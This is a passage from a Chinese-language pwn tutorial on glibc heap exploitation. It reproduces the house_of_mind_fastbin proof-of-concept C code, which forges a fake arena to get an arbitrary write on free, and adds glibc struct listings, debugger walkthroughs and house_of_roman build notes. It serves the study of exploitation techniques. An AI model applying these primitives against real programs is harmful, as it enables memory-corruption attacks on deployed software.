<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085422164.png"
                      alt="image-20231013085422164"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085545532.png"
                      alt="image-20231013085545532"
                ></p>
<p>然后申请两次 <code>0x110</code> 大小的 <code>chunk</code>，分别为 <code>p3</code> <code>p4</code>，会将 <code>small_chunk</code>  和 <code>stack1</code> 取出来，然后覆盖 <code>main</code> 返回地址为目标函数地址即可完成任意地址写。</p>
<h2 id="house-of-mind-fastbin"><a href="#house-of-mind-fastbin" class="headerlink" title="house_of_mind_fastbin"></a>house_of_mind_fastbin</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27;</span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x880) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above.</span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size.</span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself.</span></span><br><span class="line"><span class="comment">	In 2.23, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an</span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x28 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs.</span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	<span class="built_in">assert</span>(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>2.23</code>版本和 <code>2.27</code> 以后间 <code>fastbinY[4]</code> 数组的偏移不同，<code>2.23</code> 为 <code>0x38</code> ，<code>2.27</code> 以后加入了 <code>have_fastchunks </code>，需要向后偏移 <code>0x8</code> 字节，即偏移为 <code>0x40</code>。<code>2.23</code> 的<code>malloc_state</code> 及 <code>_heap_info</code> 源码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-15"><a href="#调试-15" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013162104393.png"
                      alt="image-20231013162104393"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013171006999.png"
                      alt="image-20231013171006999"
                ></p>
<p><code>target_loc</code> 位置在 <code>fake_arena_chunk + 0x30</code>  处，也就是 <code>fake_arena_fastbinY[4]</code> 处，因为我们要申请的 <code>fast_chunk</code> 大小为 <code>0x60</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013163308872.png"
                      alt="image-20231013163308872"
                ></p>
<p> <code>system_mem</code> 标识这个 <code>arena</code> 管理的空间大小，请求的内存不能大于 <code>system_mem</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013170335971.png"
                      alt="image-20231013170335971"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172604185.png"
                      alt="image-20231013172604185"
                ></p>
<p>在系统堆初始化之后，将堆的大小定为 <code>0x4000000</code>，因此后面申请的假 <code>arena</code> 管理的地址在这个堆之后，要计算这个堆的起始地址，程序中这个地址为 <code>0x4000000</code>。<code>MAX_SIZE</code> 大小为 <code>0x1ff00 &lt; 0x20000</code>  也就不会触发 <code>mmap</code> 申请机制。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172858520.png"
                      alt="image-20231013172858520"
                ></p>
<p>一直分配 <code>MAX_SIZE</code> 大小的 <code>chunk</code> 直到系统的 <code>main_heap</code> 被申请完。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173848951.png"
                      alt="image-20231013173848951"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173951000.png"
                      alt="image-20231013173951000"
                ></p>
<p>在新的堆区申请 <code>0x60</code> 大小的 <code>fast_chunk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013174809638.png"
                      alt="image-20231013174809638"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175009240.png"
                      alt="image-20231013175009240"
                ></p>
<p><code>fake_heap_info[0]==ar_ptr -&gt; fake_arena</code> 将 <code>ar_ptr</code> 指针指向我们的 <code>fake_arena</code>  ，<code>ar_ptr</code> 指针指向一个为该堆服务的<code>arena</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175140816.png"
                      alt="image-20231013175140816"
                ></p>
<p><code>fastbin_chunk_size = 0x60 | 0x4(0100B)</code> 将 <code>NON_MAIN_ARENA</code> 置为 <code>1</code> ，标明其不在主堆区。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175714934.png"
                      alt="image-20231013175714934"
                ></p>
<p><code>free(fastbin_chunk_fd)</code>  后，将会把它链接到 <code>fake_heap_info_ar_ptr</code> 指向 <code>fake_arena</code> 的 <code>fastbinY[4] (0x60)</code> 处，也就是 <code>0x603448</code> 处。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175937769.png"
                      alt="image-20231013175937769"
                ></p>
<p>此时完成利用成功将目标地址内容写为 <code>fastbin_chunk_prev_addr</code> 。</p>
<h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house_of_roman"></a>house_of_roman</h2><p><code>glibc &lt; 2.29</code></p>
<p>编译选项: <code>gcc -g house_of_roman.c -fpie -pie -ldl -o house_of_roman</code></p>
<p>除了 <code>libc-2.23.so</code> 和 <code>ld-2.23.so</code> 需要 <code>patch</code> 以外，还需要 <code>patch</code> 一下 <code>libdl-2.23.so</code></p>
<p><code>patchelf --replace-needed libdl.so.2 ./libdl-2.23.so house_of_roman</code></p>
